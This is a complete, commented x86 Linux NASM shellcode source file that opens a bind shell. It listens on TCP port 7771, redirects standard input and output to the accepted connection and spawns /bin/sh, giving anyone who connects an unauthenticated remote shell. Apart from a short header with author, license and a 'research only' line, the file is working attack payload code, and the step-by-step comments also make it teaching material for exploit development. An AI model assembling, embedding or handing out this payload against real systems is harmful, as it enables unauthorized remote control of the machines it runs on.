; Title Linux Shell Bind TCP Shellcode
; Filename:bind_connect_execve_stack.nasm
; Author: Oleg Boytsev
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

global _start		;this is for linker

section .text		;text section
_start:			;this is for linker

;cat /usr/include/i386-linux-gnu/asm/unistd_32.h - syscall table is here
;cat /usr/include/linux/net.h	- this is the master header file for the Linux NET layer
;man socket	- how to create a connection

;The first step is to create an endpoint for communication and return a socket file descriptor: socket(int domain, int type, int protocol)
xor eax, eax	;zeroed eax
mov al, 102	;socketcall()
xor ebx, ebx	;zeroed ebx
mov bl, 1 	;net.h/SYS_SOCKET code 
xor esi, esi	;zeroed esi
push esi	;push 0 into stack (protocol)
push 1 		;push 1 into stack (SOCK_STREAM), man 2 socket
push 2 		;push 2 into stack (AF_INET), man 2 socket
mov ecx, esp 	;move a pointer to arguments array into ecx
int 0x80	;run syscall

mov edx, eax	;save socket fd into edx

;The second step is BIND. Bind assignes the address to the precreated socket file descriptor. bind(int sockfd, (const struct sockaddr *addr), socklen_t addrlen);
;man 7 ip
mov al, 102	;socketcall()
mov bl, 2	;net.h/SYS_BIND code

;Making const struct sockaddr *addr (address family: AF_INET, port, Internet address)
push esi	;push 0 into stack (0 means any address)
push WORD 0x5b1e ;hex port in reverse (printf «%x» 7771 = 1e5b)
push WORD 2 	;push 2 into stack (AF_INET)
mov ecx, esp	;move a pointer to arguments array into ecx

;Bind itself. bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
push 16 	;socklen_t addrlen
push ecx 	;pointer to sockaddr struct
push edx 	;push sockfd into stack
mov ecx, esp	;move a pointer to arguments array into ecx
int 0x80	;run syscall

;LISTEN/man listen: listen(int sockfd, int backlog);
mov al, 102 	;socketcall()
mov bl, 4 	;net.h/SYS_LISTEN
push 1 		;backlog
push edx 	;sockfd
mov ecx, esp	;move a pointer to arguments array into ecx
int 0x80	;run syscall

;ACCEPT/man accept: int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
mov al, 102 	;socketcall()
mov bl, 5 	;SYS_ACCEPT
push esi	;0 into stack
push esi	;0 into stack
push edx 	;sockfd
mov ecx, esp	;move a pointer to arguments array into ecx
int 0x80	;run syscall	

;sockfd save
mov edx, eax	;save socket fd into edx

;DUP2/man dup2: int dup2(int oldfd, int newfd); Duplicate a file descriptor
xor eax, eax	;zeroed eax
mov al, 63 	;dup2() code
mov ebx, edx 	;save old fd in ebx
xor ecx, ecx 	;get 0, this is STDIN file descriptor
int 0x80	;run syscall

xor eax, eax	;zeroed eax
mov al, 63	;mov dup2() code into al
mov cl, 1 	;STDOUT
int 0x80	;run syscall

mov al, 63	;dup2() code
mov cl, 2 	;STDERROR
int 0x80	;run syscall

;spawn a shell
xor eax, eax	;zeroed eax
push eax	;push NULL into stack
push 0x68732f2f	;push reversed //sh into stack
push 0x6e69622f	;push reversed /bin into stack
mov ebx, esp	;copy pointer to /bin//sh string into ebx
push eax	;push NULL into stack 
push ebx	;push pointer to /bin//sh into stack
mov ecx, esp	;mov pointer to argv[] (/bin/sh, NULL) into ecx
xor edx, edx	;zeroed edx (edx contain envp[])
mov al, 0xb	;mov execve() code into al
int 0x80	;run syscall
